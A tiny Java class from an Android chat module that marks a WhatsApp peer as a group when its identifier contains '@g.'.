package com.android.deviceinfo.module.chat;

public class ChatWhatsappGroups extends ChatGroups {
	@Override
	boolean isGroup(String peer) {
		return peer.contains("@g.");
	}

}
